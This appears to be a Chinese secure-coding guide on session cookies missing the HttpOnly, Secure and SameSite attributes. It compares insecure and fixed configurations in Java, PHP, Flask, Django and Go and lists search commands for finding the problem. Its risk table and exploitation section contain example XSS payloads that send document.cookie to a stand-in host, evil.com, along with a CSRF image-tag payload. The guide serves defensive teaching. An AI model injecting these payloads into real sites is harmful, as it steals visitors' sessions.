# 会话 Cookie 安全属性缺失（Cookie Security Misconfiguration）

## 漏洞模式

会话 Cookie 缺少 `HttpOnly`、`Secure`、`SameSite` 等安全属性，导致：
- 缺少 `HttpOnly`：XSS 攻击可通过 `document.cookie` 直接窃取 Session ID
- 缺少 `Secure`：Session Cookie 可在 HTTP 明文传输中被中间人截获
- 缺少 `SameSite`：CSRF 攻击可自动附带 Cookie 发起跨站请求

**核心原则：会话 Cookie 必须同时设置 `HttpOnly`、`Secure`、`SameSite` 属性。这是纵深防御的基础层，与业务逻辑无关，没有理由不设置。**

## 通用代码示例

### Java — web.xml / Spring Boot

```xml
<!-- ❌ web.xml 未配置 cookie 安全属性 -->
<session-config>
    <session-timeout>30</session-timeout>
    <!-- 无 cookie-config -->
</session-config>
```

```xml
<!-- ✅ web.xml 完整配置 -->
<session-config>
    <session-timeout>30</session-timeout>
    <cookie-config>
        <http-only>true</http-only>
        <secure>true</secure>
    </cookie-config>
</session-config>
```

```yaml
# ❌ Spring Boot application.yml 未配置
server:
  servlet:
    session:
      timeout: 30m
```

```yaml
# ✅ Spring Boot application.yml 完整配置
server:
  servlet:
    session:
      timeout: 30m
      cookie:
        http-only: true
        secure: true
        same-site: lax
```

```java
// ❌ Spring Security 手动创建 Cookie 未设安全属性
Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
response.addCookie(sessionCookie);

// ✅ 设置完整安全属性
Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
sessionCookie.setHttpOnly(true);
sessionCookie.setSecure(true);
sessionCookie.setPath("/");
sessionCookie.setMaxAge(1800);
response.addCookie(sessionCookie);
// 注意：Servlet API 的 Cookie 类不直接支持 SameSite，需通过 response header 设置
response.setHeader("Set-Cookie",
    String.format("JSESSIONID=%s; Path=/; HttpOnly; Secure; SameSite=Lax", sessionId));
```

### PHP

```php
// ❌ php.ini 默认配置（多数旧版本不安全）
// session.cookie_httponly = 0
// session.cookie_secure = 0
// session.cookie_samesite = (空)

// ❌ session_start() 前未设置安全参数
session_start();
```

```php
// ✅ 方法 1：php.ini 配置
// session.cookie_httponly = 1
// session.cookie_secure = 1
// session.cookie_samesite = Lax

// ✅ 方法 2：代码中显式设置
session_set_cookie_params([
    'lifetime' => 1800,
    'path'     => '/',
    'domain'   => '.example.com',
    'secure'   => true,
    'httponly'  => true,
    'samesite'  => 'Lax',
]);
session_start();
```

### Python Flask / Django

```python
# ❌ Flask 默认配置（不安全）
app = Flask(__name__)
app.secret_key = 'some_secret'
# 默认：SESSION_COOKIE_HTTPONLY=True（✅），但 SESSION_COOKIE_SECURE=False（❌）
```

```python
# ✅ Flask 完整配置
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(minutes=30),
)
```

```python
# Django settings.py
# ❌ 默认
SESSION_COOKIE_HTTPONLY = True  # Django 默认 ✅
SESSION_COOKIE_SECURE = False  # Django 默认 ❌

# ✅ 安全配置
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_AGE = 1800
```

### Go — net/http / gin

```go
// ❌ 手动设置 Cookie 未带安全属性
http.SetCookie(w, &http.Cookie{
    Name:  "session_id",
    Value: sessionID,
    Path:  "/",
})
```

```go
// ✅ 完整安全属性
http.SetCookie(w, &http.Cookie{
    Name:     "session_id",
    Value:    sessionID,
    Path:     "/",
    HttpOnly: true,
    Secure:   true,
    SameSite: http.SameSiteLaxMode,
    MaxAge:   1800,
})
```

## 各属性缺失的风险

| 属性 | 缺失时的风险 | 攻击向量 |
|------|------------|---------|
| `HttpOnly` | XSS 可通过 `document.cookie` 窃取 Session ID | 存储型/反射型 XSS → `fetch('https://evil.com?c='+document.cookie)` |
| `Secure` | Cookie 在 HTTP 明文请求中传输 | 中间人攻击（WiFi 嗅探、ARP 欺骗）截获 Session ID |
| `SameSite` | 跨站请求自动附带 Cookie | CSRF 攻击：`<img src="https://target.com/api/transfer?to=attacker">` |
| `Path` 过宽（`/`） | 同域下所有路径共享 Cookie | 低权限路径下的 XSS 可窃取高权限 Cookie |
| `Domain` 过宽（`.example.com`） | 所有子域共享 Cookie | 子域上的 XSS 可窃取主站 Session |

## 检测方法

1. **搜索 Cookie 设置代码**：`rg "Set-Cookie|setCookie|addCookie|set_cookie|session.cookie|cookie_params|http\.Cookie"`
2. **搜索框架配置**：`rg "cookie.http.only|cookie.secure|cookie_httponly|cookie_secure|SameSite|SESSION_COOKIE"` 检查配置文件
3. **检查 web.xml / php.ini / application.yml / settings.py**：确认 session cookie 相关配置项
4. **对比三个属性**：逐一确认 HttpOnly、Secure、SameSite 是否全部设置

## 利用场景

- **XSS + 缺 HttpOnly**：攻击者在评论中注入 `<script>new Image().src='https://evil.com/?c='+document.cookie</script>`，窃取所有访问者的 Session
- **公共 WiFi + 缺 Secure**：攻击者在咖啡厅 WiFi 嗅探 HTTP 流量，直接获取 Session Cookie
- **CSRF + 缺 SameSite**：攻击者构造恶意页面，受害者访问后自动向目标站点发起带 Cookie 的请求
